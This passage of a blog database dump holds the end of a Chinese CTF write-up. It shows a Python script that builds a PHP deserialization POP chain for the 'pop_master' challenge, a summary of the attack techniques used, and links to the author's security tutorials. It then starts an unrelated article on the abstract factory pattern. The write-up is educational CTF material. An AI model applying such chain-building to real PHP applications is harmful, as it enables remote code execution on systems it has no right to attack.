keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> Method<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n			<span class=\"token keyword\">if</span> node<span class=\"token punctuation\">.</span>name <span class=\"token operator\">==</span> func_name<span class=\"token punctuation\">:</span>\n				<span class=\"token keyword\">for</span> subnode <span class=\"token keyword\">in</span> node<span class=\"token punctuation\">.</span>nodes<span class=\"token punctuation\">:</span>\n					<span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>subnode<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> MethodCall<span class=\"token punctuation\">:</span>\n						<span class=\"token comment\"># print(subnode)</span>\n						<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>subnode<span class=\"token punctuation\">.</span>name <span class=\"token keyword\">in</span> skip_func<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n							<span class=\"token keyword\">continue</span>\n						target <span class=\"token operator\">=</span> functions<span class=\"token punctuation\">[</span>subnode<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">]</span>\n						func_name <span class=\"token operator\">=</span> subnode<span class=\"token punctuation\">.</span>name\n						pop_chain<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>func_name<span class=\"token punctuation\">)</span>\n						<span class=\"token keyword\">break</span>\n					<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>subnode<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> If<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n						<span class=\"token comment\"># print(subnode)</span>\n						<span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>subnode<span class=\"token punctuation\">.</span>node<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> MethodCall <span class=\"token punctuation\">:</span>\n							<span class=\"token comment\"># print(subnode.node.name)</span>\n							<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> subnode<span class=\"token punctuation\">.</span>node<span class=\"token punctuation\">.</span>name <span class=\"token keyword\">in</span> skip_func<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n								<span class=\"token keyword\">continue</span>\n							target <span class=\"token operator\">=</span> functions<span class=\"token punctuation\">[</span>subnode<span class=\"token punctuation\">.</span>node<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">]</span>\n							func_name <span class=\"token operator\">=</span> subnode<span class=\"token punctuation\">.</span>node<span class=\"token punctuation\">.</span>name\n							pop_chain<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>func_name<span class=\"token punctuation\">)</span>\n							<span class=\"token keyword\">break</span>\n						<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>subnode<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> Eval<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n							e <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span>\n<span class=\"token keyword\">for</span> pop <span class=\"token keyword\">in</span> pop_chain<span class=\"token punctuation\">:</span>\n	<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"class \"</span> <span class=\"token operator\">+</span> functions<span class=\"token punctuation\">[</span>pop<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\"{\"</span><span class=\"token punctuation\">)</span>\n	<span class=\"token keyword\">for</span> node <span class=\"token keyword\">in</span> functions<span class=\"token punctuation\">[</span>pop<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>nodes<span class=\"token punctuation\">:</span>\n		<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>node<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> ClassVariables<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n			<span class=\"token keyword\">for</span> subnode <span class=\"token keyword\">in</span> node<span class=\"token punctuation\">.</span>nodes<span class=\"token punctuation\">:</span>\n				<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"public \"</span> <span class=\"token operator\">+</span> subnode<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\';\'</span><span class=\"token punctuation\">)</span>\n				<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"public function __construct(){\"</span><span class=\"token punctuation\">)</span>\n				<span class=\"token keyword\">if</span> i<span class=\"token operator\">+</span><span class=\"token number\">1</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pop_chain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n					<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n				<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n					<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$this-&gt;\"</span> <span class=\"token operator\">+</span> subnode<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"= new \"</span> <span class=\"token operator\">+</span> \n					functions<span class=\"token punctuation\">[</span>pop_chain<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\"();\"</span><span class=\"token punctuation\">)</span>\n				<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"}\"</span><span class=\"token punctuation\">)</span>\n	<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"}\"</span><span class=\"token punctuation\">)</span>\n	i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n	<span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>pop_chain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n		<span class=\"token keyword\">break</span>\n</code></pre> \n <h2><a id=\"3_610\"></a>3.官方解题</h2> \n <p>后续补充官方解题和手撸过程…</p> \n <hr> \n <h1><a id=\"_617\"></a>五.总结</h1> \n <p>写到这里，这篇文章就介绍结束了，希望对您有所帮助。希望三年博士毕业后，我不再是WP分享者，而能够通过参赛和学习做出更多的题目，也期待带学生一起比赛的一天，加油！下面简单总结每题知识点。</p> \n <ul>\n  <li>第一题 EasyWeb<br> <mark><strong>敏感目录扫描+注入漏洞+文件上传+ jboss部署war</strong></mark><br> -第二题 [强网先锋]寻宝<br> <strong><mark>PHP代码审计+Python遍历doc文件+两个KEY解密</mark></strong></li>\n  <li>第三题 [强网先锋]赌徒<br> <mark><strong>敏感目录扫描+源文件代码审计+反序列化漏洞+bypass构造</strong></mark></li>\n  <li>第四题 pop_master<br> <mark><strong>坐等官方解密</strong></mark></li>\n </ul> \n <p>作者作为网络安全的小白，分享一些自学基础教程给大家，主要是关于安全工具和实践操作的在线笔记，希望您们喜欢。同时，由于在外读博，目前暂停技术更新，但这篇确实应该总结下，希望您能与我一起操作和进步。总之，希望该系列文章对博友有所帮助，写文不易，大神们不喜勿喷，谢谢！如果文章对您有帮助，将是我创作的最大动力，点赞、评论、私聊均可，一起加油喔。同时再次感谢参考文献中的安全大佬们的文章分享，尤其Nu1L战队，深知自己很菜，得努力前行。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210513000605810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"300\" height=\"380\"></p> \n <p><strong>欢迎大家讨论，是否觉得这系列文章帮助到您！任何建议都可以评论告知读者，共勉。</strong></p> \n <ul>\n  <li>逆向分析：<a href=\"https://github.com/eastmountyxz/SystemSecurity-ReverseAnalysis\">https://github.com/eastmountyxz/SystemSecurity-ReverseAnalysis</a></li>\n  <li>网络安全：<a href=\"https://github.com/eastmountyxz/NetworkSecuritySelf-study\">https://github.com/eastmountyxz/NetworkSecuritySelf-study</a></li>\n </ul> \n <p>(By:Eastmount 2021-06-15 夜于武汉 <a href=\"http://blog.csdn.net/eastmount/\">http://blog.csdn.net/eastmount/</a> )</p> \n <hr> \n <p><strong>自学篇（链接直接跳转到正文）：</strong></p> \n <ul>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/97784774\">[网络安全自学篇] 一.入门笔记之看雪Web安全学习及异或解密示例</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/98340074\">[网络安全自学篇] 二.Chrome浏览器保留密码功能渗透解析及登录加密入门笔记</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/98469967\">[网络安全自学篇] 三.Burp Suite工具安装配置、Proxy基础用法及暴库示例</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/98529597\">[网络安全自学篇] 四.实验吧CTF实战之WEB渗透和隐写术解密</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/98789742\">[网络安全自学篇] 五.IDA Pro反汇编工具初识及逆向工程解密实战</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/99088681\">[网络安全自学篇] 六.OllyDbg动态分析工具基础用法及Crakeme逆向</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/100544347\">[网络安全自学篇] 七.快手视频下载之Chrome浏览器Network分析及Python爬虫探讨</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/100566032\">[网络安全自学篇] 八.Web漏洞及端口扫描之Nmap、ThreatScan和DirBuster工具</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/100585715\">[网络安全自学篇] 九.社会工程学之基础概念、IP获取、IP物理定位、文件属性</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/100784947\">[网络安全自学篇] 十.论文之基于机器学习算法的主机恶意代码</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/101000161\">[网络安全自学篇] 十一.虚拟机VMware+Kali安装入门及Sqlmap基本用法</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/101076537\">[网络安全自学篇] 十二.Wireshark安装入门及抓取网站用户名密码（一）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/101101829\">[网络安全自学篇] 十三.Wireshark抓包原理（ARP劫持、MAC泛洪）及数据流追踪和图像抓取（二）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/101645333\">[网络安全自学篇] 十四.Python攻防之基础常识、正则表达式、Web编程和套接字通信（一）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/102138329\">[网络安全自学篇] 十五.Python攻防之多线程、C段扫描和数据库编程（二）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/102469991\">[网络安全自学篇] 十六.Python攻防之弱口令、自定义字典生成及网站暴库防护</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/102499639\">[网络安全自学篇] 十七.Python攻防之构建Web目录扫描器及ip代理池（四）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/102511286\">[网络安全自学篇] 十八.XSS跨站脚本攻击原理及代码攻防演示（一）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/102781411\">[网络安全自学篇] 十九.Powershell基础入门及常见用法（一）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/102794131\">[网络安全自学篇] 二十.Powershell基础入门及常见用法（二）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/102889605\">[网络安全自学篇] 二十一.GeekPwn极客大赛之安全攻防技术总结及ShowTime</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/102816621\">[网络安全自学篇] 二十二.Web渗透之网站信息、域名信息、端口信息、敏感信息及指纹信息收集</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/102852458\">[网络安全自学篇] 二十三.基于机器学习的恶意请求识别及安全领域中的机器学习</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103189405\">[网络安全自学篇] 二十四.基于机器学习的恶意代码识别及人工智能中的恶意代码检测</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103018495\">[网络安全自学篇] 二十五.Web安全学习路线及木马、病毒和防御初探</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103135719\">[网络安全自学篇] 二十六.Shodan搜索引擎详解及Python命令行调用</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103170828\">[网络安全自学篇] 二十七.Sqlmap基础用法、CTF实战及请求参数设置（一）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103433706\">[网络安全自学篇] 二十八.文件上传漏洞和Caidao入门及防御原理（一）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103452557\">[网络安全自学篇] 二十九.文件上传漏洞和IIS6.0解析漏洞及防御原理（二）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103479614\">[网络安全自学篇] 三十.文件上传漏洞、编辑器漏洞和IIS高版本漏洞及防御（三）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103552209\">[网络安全自学篇] 三十一.文件上传漏洞之Upload-labs靶场及CTF题目01-10（四）</a></li>\n  <li>[网络安全自学篇] 三十二.文件上传漏洞之Upload-labs靶场及CTF题目11-20（五）</li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103612329\">[网络安全自学篇] 三十三.文件上传漏洞之绕狗一句话原理和绕过安全狗（六）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103618914\">[网络安全自学篇] 三十四.Windows系统漏洞之5次Shift漏洞启动计算机</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103703819\">[网络安全自学篇] 三十五.恶意代码攻击溯源及恶意样本分析</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103876466\">[网络安全自学篇] 三十六.WinRAR漏洞复现（CVE-2018-20250）及恶意软件自启动劫持</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103896845\">[网络安全自学篇] 三十七.Web渗透提高班之hack the box在线靶场注册及入门知识（一）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103938700\">[网络安全自学篇] 三十八.hack the box渗透之BurpSuite和Hydra密码爆破及Python加密Post请求（二）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103963573\">[网络安全自学篇] 三十九.hack the box渗透之DirBuster扫描路径及Sqlmap高级注入用法（三）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103925419\">[网络安全自学篇] 四十.phpMyAdmin 4.8.1后台文件包含漏洞复现及详解（CVE-2018-12613）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/103898463\">[网络安全自学篇] 四十一.中间人攻击和ARP欺骗原理详解及漏洞还原</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104065639\">[网络安全自学篇] 四十二.DNS欺骗和钓鱼网站原理详解及漏洞还原</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104113939\">[网络安全自学篇] 四十三.木马原理详解、远程服务器IPC$漏洞及木马植入实验</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104134085\">[网络安全自学篇] 四十四.Windows远程桌面服务漏洞（CVE-2019-0708）复现及详解</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104146757\">[网络安全自学篇] 四十五.病毒详解及批处理病毒制作（自启动、修改密码、定时关机、蓝屏、进程关闭）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104335673\">[网络安全自学篇] 四十六.微软证书漏洞CVE-2020-0601 (上)Windows验证机制及可执行文件签名复现</a></li>\n  <li>[网络安全自学篇] 四十七.微软证书漏洞CVE-2020-0601 (下)Windows证书签名及HTTPS网站劫持</li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104383134\">[网络安全自学篇] 四十八.Cracer第八期——(1)安全术语、Web渗透流程、Windows基础、注册表及常用DOS命令</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104480406\">[网络安全自学篇] 四十九.Procmon软件基本用法及文件进程、注册表查看</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104536766\">[网络安全自学篇] 五十.虚拟机基础之安装XP系统、文件共享、网络快照设置及Wireshark抓取BBS密码</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104547485\">[网络安全自学篇] 五十一.恶意样本分析及HGZ木马控制目标服务器</a></li>\n  <li>[网络安全自学篇] 五十二.Windows漏洞利用之栈溢出原理和栈保护GS机制</li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104573931\">[网络安全自学篇] 五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104593520\">[网络安全自学篇] 五十四.Windows漏洞利用之基于SEH异常处理机制的栈溢出攻击及shell提取</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104612053\">[网络安全自学篇] 五十五.Windows漏洞利用之构建ROP链绕过DEP并获取Shell</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104639277\">[网络安全自学篇] 五十六.i春秋老师分享小白渗透之路及Web渗透技术总结</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104769616\">[网络安全自学篇] 五十七.PE文件逆向之什么是数字签名及Signtool签名工具详解（一）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104801332\">[网络安全自学篇] 五十八.Windows漏洞利用之再看CVE-2019-0708及Metasploit反弹shell</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104834931\">[网络安全自学篇] 五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/104843609\">[网络安全自学篇] 六十.Cracer第八期——(2)五万字总结Linux基础知识和常用渗透命令</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105074188\">[网络安全自学篇] 六十一.PE文件逆向之数字签名详细解析及Signcode、PEView、010Editor、Asn1View等工具用法（二）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105080804\">[网络安全自学篇] 六十二.PE文件逆向之PE文件解析、PE编辑工具使用和PE结构修改（三）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105118450\">[网络安全自学篇] 六十三.hack the box渗透之OpenAdmin题目及蚁剑管理员提权（四）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105350314\">[网络安全自学篇] 六十四.Windows漏洞利用之SMBv3服务远程代码执行漏洞（CVE-2020-0796）复现及详解</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105423490\">[网络安全自学篇] 六十五.Vulnhub靶机渗透之环境搭建及JIS-CTF入门和蚁剑提权示例（一）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105442329\">[网络安全自学篇] 六十六.Vulnhub靶机渗透之DC-1提权和Drupal漏洞利用（二）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105407843\">[网络安全自学篇] 六十七.WannaCry勒索病毒复现及分析（一）Python利用永恒之蓝及Win7勒索加密</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105640538\">[网络安全自学篇] 六十八.WannaCry勒索病毒复现及分析（二）MS17-010利用及病毒解析</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105646194\">[网络安全自学篇] 六十九.宏病毒之入门基础、防御措施、自发邮件及APT28样本分析</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105760940\">[网络安全自学篇] 七十.WannaCry勒索病毒复现及分析（三）蠕虫传播机制分析及IDA和OD逆向</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105808305\">[网络安全自学篇] 七十一.深信服分享之外部威胁防护和勒索病毒对抗</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105843983\">[网络安全自学篇] 七十二.逆向分析之OllyDbg动态调试工具（一）基础入门及TraceMe案例分析</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/105903050\">[网络安全自学篇] 七十三.WannaCry勒索病毒复现及分析（四）蠕虫传播机制全网源码详细解读</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106009460\">[网络安全自学篇] 七十四.APT攻击检测溯源与常见APT组织的攻击案例</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106066009\">[网络安全自学篇] 七十五.Vulnhub靶机渗透之bulldog信息收集和nc反弹shell（三）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106100467\">[网络安全自学篇] 七十六.逆向分析之OllyDbg动态调试工具（二）INT3断点、反调试、硬件断点与内存断点</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106110294\">[网络安全自学篇] 七十七.恶意代码与APT攻击中的武器（强推Seak老师）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106183208\">[网络安全自学篇] 七十八.XSS跨站脚本攻击案例分享及总结（二）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106204633\">[网络安全自学篇] 七十九.Windows PE病毒原理、分类及感染方式详解</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106409569\">[网络安全自学篇] 八十.WHUCTF之WEB类解题思路WP（代码审计、文件包含、过滤绕过、SQL注入）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106428277\">[网络安全自学篇] 八十一.WHUCTF之WEB类解题思路WP（文件上传漏洞、冰蝎蚁剑、反序列化phar）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106459166\">[网络安全自学篇] 八十二.WHUCTF之隐写和逆向类解题思路WP（文字解密、图片解密、佛语解码、冰蝎流量分析、逆向分析）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106560849\">[网络安全自学篇] 八十三.WHUCTF之CSS注入、越权、csrf-token窃取及XSS总结</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106718606\">[网络安全自学篇] 八十四.《Windows hk编程技术详解》之VS环境配置、基础知识及DLL延迟加载详解</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106929277\">[网络安全自学篇] 八十五.《Windows hk编程技术详解》之注入技术详解（全局钩子、远线程钩子、突破Session 0注入、APC注入）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/107345903\">[网络安全自学篇] 八十六.威胁情报分析之Python抓取FreeBuf网站APT文章（上）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/106975996\">[网络安全自学篇] 八十七.恶意代码检测技术详解及总结</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/107420755\">[网络安全自学篇] 八十八.基于机器学习的恶意代码检测技术详解</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/107384250\">[网络安全自学篇] 八十九.PE文件解析之通过Python获取时间戳判断软件来源地区</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/107449094\">[网络安全自学篇] 九十.远控木马详解及APT攻击中的远控</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/107579485\">[网络安全自学篇] 九十一.阿里云搭建LNMP环境及实现PHP自定义网站IP访问 (1)</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/107578717\">[网络安全自学篇] 九十二.《Windows hk编程技术详解》之病毒启动技术创建进程API、突破SESSION0隔离、内存加载详解（3）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/108020041\">[网络安全自学篇] 九十三.《Windows hk编程技术详解》之木马开机自启动技术（注册表、计划任务、系统服务）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/108486283\">[网络安全自学篇] 九十四.《Windows hk编程技术详解》之提权技术（令牌权限提升和Bypass UAC）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/108620036\">[网络安全自学篇] 九十五.利用XAMPP任意命令执行漏洞提升权限（CVE-2020-11107）</a></li>\n </ul> \n <hr> \n <p><strong>提高篇：</strong></p> \n <ul>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/112565563\">[网络安全提高班] 一〇一.网络空间安全普及和医疗数据安全防护总结</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/114040707\">[网络安全提高篇] 一〇二.Metasploit技术之基础用法万字详解及MS17-010漏洞复现</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/114188641\">[网络安全提高篇] 一〇三.Metasploit后渗透技术之信息收集、权限提权、移植漏洞模块和后门</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/115057662\">[网络安全提高篇] 一〇四.网络渗透靶场Oracle+phpStudy本地搭建万字详解（SQL注入、XSS攻击、文件上传漏洞）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/115050808\">[网络安全提高篇] 一〇五.SQL注入之揭秘Oracle数据库注入漏洞和致命问题（联合Cream老师）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/115252972\">[网络安全提高篇] 一〇六.SQL注入之手工注入和SQLMAP入门案例详解</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/114959855\">[网络安全提高篇] 一〇七.安全威胁框架理解及勒索病毒取证溯源分析（蓝队）</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/115503946\">[网络安全提高篇] 一〇八.Powershell和PowerSploit脚本攻击详解 (1)</a></li>\n  <li><a href=\"https://blog.csdn.net/Eastmount/article/details/116654719\">[网络安全提高篇] 一〇九.津门杯CTF的Web Write-Up万字详解（SSRF、文件上传、SQL注入、代码审计、中国蚁剑）</a></li>\n </ul> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (85, 'python：水果与设计模式-抽象工厂模式', '<div id=\"content_views\" class=\"markdown_views prism-dracula\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p><strong><mark>抽象工厂模式（Abstract Factory Pattern）</mark>：<strong>属于创建型模式，它提供了一种创建对象的最佳方式。</strong><mark>在抽象工厂模式中，接口是负责创建一个相关对象的工厂，不需要显式指定它们的类，每个生成的工厂都能按照工厂模式提供对象。</mark></strong></p> \n <p><strong><mark>意图</mark>：</strong> <code>提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。</code></p> \n <p><strong><mark>主要解决</mark>：</strong> 主要解决接口选择的问题。</p> \n <p><strong><mark>何时使用</mark>：</strong> 系统的产品有多于一个的产品族，而系统只消费其中某一族的产品。</p> \n <p><strong><mark>如何解决</mark>：</strong> 在一个产品族里面，定义多个产品。</p> \n <p><strong><mark>关键代码</mark>：</strong> 在一个工厂里聚合多个同类产品。</p> \n <p><strong><mark>优点</mark>：</strong> 当一个产品族中的多个对象被设计成一起工作时，它能保证客户端始终只使用同一个产品族中的对象。<code>抽象工厂模式相较于工厂模式，划分更加明确清晰，面对复杂的生产任务，管理和生产性能会更加高效。</code></p> \n <p><strong><mark>缺点</mark>：</strong> <code>产品族扩展非常困难，要增加一整个系列的某一产品。</code></p> \n <p><strong><mark>注意事项</mark>：</strong> 产品族难扩展，产品等级易扩展。</p> \n <p><strong><mark>应用实例</mark>：</strong> 对于一个生产水果的工厂，<code>工厂模式主要针对一种水果创建一个涵盖与该水果相关所有业务的工厂（例如：葡萄的运输、保存、加工、包装、售卖等相关业务全部被该工厂承包）；而抽象工厂模式主要针对生产其中的某一环节进行创建相应的工厂（例如：运输工厂负责管理所有水果的运输，售卖工厂负责管理所有水果的价格和售卖，库存工厂负责管理所有水果的库存计数等）</code>。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210614160028586.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FjY2VwdGVkZGF5,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <p><strong>那我们来一起使用抽象工厂模式，构建一个购买水果的收银小项目吧！(づ｡◕ᴗᴗ◕｡)づ</strong></p> \n <p><strong><mark>实现的思路</mark></strong>：</p> \n <ul>\n  <li>项目的主体包含6个部分：消费者（买水果的人），水果工厂（卖水果的人），水果工厂旗下的子工厂（品种工厂、价格工厂、包装工厂、称重工厂</li>\n  <li>消费者主要向水果工厂传达“购买需求”的相关信息（水果的种类、包装、重量等…）；</li>\n  